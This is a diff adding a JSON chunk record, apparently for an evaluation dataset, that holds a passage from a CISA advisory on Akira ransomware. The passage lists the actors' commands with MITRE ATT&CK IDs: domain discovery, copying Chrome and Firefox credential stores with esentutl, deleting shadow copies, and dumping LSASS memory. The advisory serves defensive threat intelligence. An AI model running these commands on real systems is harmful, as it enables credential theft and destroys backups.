@@ -1,0 +1,27 @@
+{
+  "chunk_id": "AA24-109A:evaluation:llama500:27250:29059",
+  "doc_id": "AA24-109A",
+  "start": 27250,
+  "end": 29059,
+  "text": "test /dclist: [T1018]\nnltest /DOMAIN_TRUSTS [T1482]\nnet group “Domain admins” /dom [T1069.002]\nnet localgroup “Administrators” /dom [T1069.001]\ntasklist [T1057]\nTable 9. Commands Used for Credential Access\nCommands\ncmd.exe /Q /c esentutl.exe /y\n\"C:\\Users\\<username>\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\<firefox_profile_id>.defaultrelease\\key4.db\" /d\n\"C:\\Users\\<username>\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\<firefox_profile_id>.defaultrelease\\key4.db.tmp”\nNote: Akira threat actors use these commands to access Firefox data.\ncmd.exe /Q /c esentutl.exe /y\n\"C:\\Users\\<username>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" /d\n\"C:\\Users\\<username>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data.tmp”\nNote: Akira threat actors use these commands to access Google Chrome data.\npowershell.exe -Command \"Get-WmiObject Win32_Shadowcopy | Remove-WmiObject\" [T1490]\nrundll32.exe c:\\Windows\\System32\\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\\windows\\temp\\lsass.dmp full [T1003.001]\nMITRE ATT&CK TACTICS AND TECHNIQUES\nSee Table 10 through Table 21 for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.\nTable 10. Initial Access\nTechnique Title\nID\nUse\nValid Accounts\nT1078\nAkira threat actors obtain and abuse credentials of existing accounts to gain initial access.\nExternal Remote Services\nT1133\nAkira threat actors use remote access services, such as RDP or VPN connections, to gain initial access.\nExploit Public Facing Application\nT1190\nAkira threat actors exploit vulnerabilities in internet-facing systems to gain access to systems.\nPhishing: Spearphishing Attachment\nT1566.001\n",
+  "inherited_context": [
+    {
+      "start": 23,
+      "end": 56,
+      "text": "#StopRansomware: Akira Ransomware"
+    },
+    {
+      "start": 4770,
+      "end": 4787,
+      "text": "Technical Details"
+    },
+    {
+      "start": 27202,
+      "end": 27238,
+      "text": "Table 8. Commands Used for Discovery"
+    }
+  ],
+  "role": "extraction",
+  "parent_extraction_chunk_id": null,
+  "embedding": null
+}
